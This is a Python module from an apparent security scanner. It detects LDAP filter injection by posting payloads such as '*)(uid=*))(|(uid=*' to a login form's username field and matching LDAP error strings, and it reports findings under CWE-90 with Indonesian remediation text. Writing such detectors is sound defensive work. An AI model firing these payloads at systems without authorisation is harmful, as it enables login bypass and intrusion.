"""LDAP filter injection on enterprise login forms."""
from __future__ import annotations

from cyberloka.core import Finding, HttpClient, Severity, Target
from cyberloka.core.config import ScanConfig
from cyberloka.recon.crawler import get_state

LDAP_PAYLOADS = [
    "*)(uid=*))(|(uid=*",
    "*)(&(objectClass=*",
    "admin)(|(password=*))",
    "*",
]
ERROR_HINT = ("ldap", "invalid dn", "search filter", "ldap_search", "openldap", "ad_search")


def run(target: Target, config: ScanConfig) -> list[Finding]:
    findings: list[Finding] = []
    s = get_state(config)
    if not s:
        return findings
    form = next((f for f in s.forms if any(
        (i.get("type") or "").lower() == "password" for i in f["inputs"]
    )), None)
    if not form:
        return findings
    user_field = next((i["name"] for i in form["inputs"]
                       if (i.get("name") or "").lower() in ("username", "user", "uid")), None)
    pass_field = next((i["name"] for i in form["inputs"]
                       if (i.get("type") or "").lower() == "password"), None)
    if not (user_field and pass_field):
        return findings

    client = HttpClient(config)
    try:
        for payload in LDAP_PAYLOADS:
            r = client.post(form["action"], data={user_field: payload, pass_field: "x"})
            if r is None:
                continue
            body = (r.text or "").lower()
            if any(e in body for e in ERROR_HINT):
                findings.append(Finding(
                    module="ldap_injection", target=form["action"],
                    title="LDAP error terekspos pada form login",
                    severity=Severity.HIGH,
                    description=("Form login membongkar error LDAP saat input mengandung "
                                 "karakter filter `*)(`. Indikasi backend pakai LDAP query yang "
                                 "tidak escape input dengan baik."),
                    evidence=f"payload={payload}",
                    cwe="CWE-90",
                    remediation=("Escape karakter LDAP filter (`(`, `)`, `*`, `\\`, NUL) sebelum "
                                 "masuk ke filter string. Pakai parametrik LDAP API."),
                ))
                return findings
    finally:
        client.close()
    return findings
